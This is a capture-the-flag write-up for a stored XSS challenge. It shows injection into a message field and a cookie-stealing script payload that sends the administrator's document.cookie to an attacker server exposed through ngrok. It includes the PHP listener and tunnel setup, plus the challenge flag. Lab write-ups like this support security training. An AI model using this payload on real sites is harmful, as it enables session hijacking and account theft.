# XSS - Stored 1

**Point**: 30 points

**Description**: So easy to sploit

## Solution:

There's a form for submitting "title" and "message".

<p align="center"><img width="450px" height="300px" src="https://user-images.githubusercontent.com/48288606/158942903-a138857c-579f-4711-aa2d-f94a17d05106.png"/></p>

Let's check whether XSS is possible. Inject respectively with `<script>alert(1)</script?` and `hacking` (optional)

Nothing was happened. Reversing our input, maybe XSS occurs in second input: `hacking` for title and `<script>alert(1)</script?` for message.

<p align="center"> <img width="400px" height="150px" src="https://user-images.githubusercontent.com/48288606/158943445-969975ce-0c9d-474c-a44c-c398dc3800a6.png"> </p>

Now this proves XSS can be in action. Now we have get the **cookie** from the victim, in this challenge victim is **administrator**. We can handle that with `document.cookie`. But the point is how we can get it; as usual payload we use `alert`, `console.log`, ... it won't work when these actions take place in client side and we would only see our cookie on the screen. 

We have to delivery all collected cookie from victim (administrator) to a specific server that we take control. To do that, we can think of a tag like `<img/>` to contain our server link in `src` attribute and when the victim **GET** an image from our source, we can see the full path **URL Request** and inject cookie to that URL, also find a way to "call" that image. Payload will look like this:

```javascript
<script> document.write("<img src='{your_server_link_site}?cookie=" + document.cookie + "' />") </script>
```

Let's take action step-by-step:

1. Create a server, I use **PHP** in my case. Create a PHP file without specific content:

```PHP
<html>
    <body>
    <?php 
       
    ?>
    </body>
</html>
```
2. Run PHP server with **localhost** and optional **port** : `php -S localhost:4444 hacking.php`

3. Public our server by tunneling. I use **ngrok** to server this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   <p align="center"><img src="https://user-images.githubusercontent.com/48288606/158958343-5d03bfd3-686b-437b-8d3d-97bda34cedc1.png" /></p>

4. Send our payload: `hacking` in **title** and 
```javascript
<script> document.write("<img src='http://85ae-123-21-33-87.ngrok.io?cookie=" + document.cookie + "' />") </script>
``` 
in **message**

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158959186-eb82cb0f-93ad-4324-953f-3e43d4e86bf1.png" /> </p>

The cookie create by **administrator** shown up in the request.

FLag: **NkI9qe4cdLIO2P7MIsWS8ofD6**

